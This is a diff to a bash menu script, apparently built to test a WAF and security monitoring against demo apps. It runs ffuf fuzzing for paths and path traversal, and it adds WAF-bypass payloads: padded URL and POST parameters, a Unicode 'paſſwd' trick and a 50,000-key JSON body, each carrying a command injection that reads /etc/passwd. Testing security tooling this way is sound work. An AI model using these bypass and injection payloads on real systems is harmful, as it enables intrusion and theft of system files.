@@ -229,7 +229,7 @@ performDeserializationAttack() {
 performWAFVolumeTest() {
   # Dir fuzz should generate WAF alerts for paths like /.env
   ffuf -u 'http://'"$host"':'$emailserviceport'/FUZZ' -w ./wordlists/common.txt
-  ffuf -u 'http://'"$host"':'$emailserviceport'/FUZZ' -w ./wordlists/common.txt
+  ffuf -u 'http://'"$host"':'$petclinicport'/FUZZ' -w ./wordlists/common.txt
   # CMD I fuzz should generate WAF alerts but not contrast since it's using the wrong parameter
   ffuf -u 'http://'"$host"':'$emailserviceport'/ping?ip2=FUZZ' -w ./wordlists/cmd-i.txt
   # real cmd injection
@@ -237,7 +237,9 @@ performWAFVolumeTest() {
   # real exploit 
   performPathTraversalDownload
   # fuzz for path traversal, unauth so actual exploit should fail but trigger WAF
-  ffuf -u 'http://'"$host"':'$emailserviceport'/owners/1/pets/getPhotoByPath?photoPath=FUZZ' -w ./wordlists/path-traversal.txt
+  ffuf -u 'http://'"$host"':'$petclinicport'/owners/1/pets/getPhotoByPath?photoPath=FUZZ' -w ./wordlists/path-traversal.txt
+  # should send 10459 requests
+  # 2 exploitation events
 
 }
 
@@ -252,6 +254,7 @@ preformWAFBypassExcessiveURLParams(){
       for i in {1..400}
       do
         url="$url&param$i=value$i"
+        
       done
 
       curl "$url&ip=localhost%20;%20cat%20/etc/passwd"
@@ -266,23 +269,36 @@ preformWAFBypassExcessivePostParams(){
         params="$params&param$i=value$i"
       done
 
-      params="$params&arg=whoami"
+      params="$params&arg=cat%20/etc/passwd"
       
       curl --location "http://$host:$emailserviceport/postcmd" \
       --header 'Content-Type: application/x-www-form-urlencoded' \
       --data "$params"
 }
 
-preformWAFBypassLargePostBody(){
-      value=$(yes a | head -c 2048576 | tr -d '\n')
 
-      params="param1=$value&arg=whoami"
+preformWAFBypassUnicode(){
+  curl --location "http://$host:$emailserviceport/postcmd" \
+  --header 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode "arg=cat /etc/paſſwd"
+  }
+
+preformWAFBypassExcessiveJsonKeys(){
+    echo "{" > large_payload.json
+    echo "\"param1\":\"value1\"," >> large_payload.json
+
+    for i in {1..50000}; do
+      echo "\"param$i\":\"value$i\"," >> large_payload.json
+    done
+
+    echo "\"arg\":\"cat /etc/passwd\"" >> large_payload.json
+    echo "}" >> large_payload.json
       
-      curl --location "http://$host:$emailserviceport/postcmd" \
-      --header 'Content-Type: application/x-www-form-urlencoded' \
-      --data "$params"
+    curl --location "http://$host:$emailserviceport/postjsoncmd" \
+        --header 'Content-Type: application/json' \
+        --data-binary @"large_payload.json"
+    rm large_payload.json
 }
-
 # Function to display the menu
 display_menu() {
   echo "---------------------"
@@ -319,7 +335,8 @@ display_menu() {
   echo "27 WAF Bypass File Glob"
   echo "28 WAF Bypass Excessive URL Params"
   echo "29 WAF Bypass Excessive Post Params"
-  echo "30 WAF Bypass Large Post Body"
+  echo "30 WAF Bypass Unicode"
+  echo "31 WAF Bypass Excessive Json Keys"
   echo "---------------------"
 }
 
@@ -500,8 +517,13 @@ while true; do
       read -p "Press Enter to continue..."
     ;;
     30)
-      echo "Perform WAF Bypass Large Post Body"
-      preformWAFBypassLargePostBody
+      echo "Perform WAF Bypass Unicode"
+      preformWAFBypassUnicode
+      read -p "Press Enter to continue..."
+    ;;
+    31)
+      echo "Perform WAF Bypass Excessive Json Keys"
+      preformWAFBypassExcessiveJsonKeys
       read -p "Press Enter to continue..."
     ;;
     *)
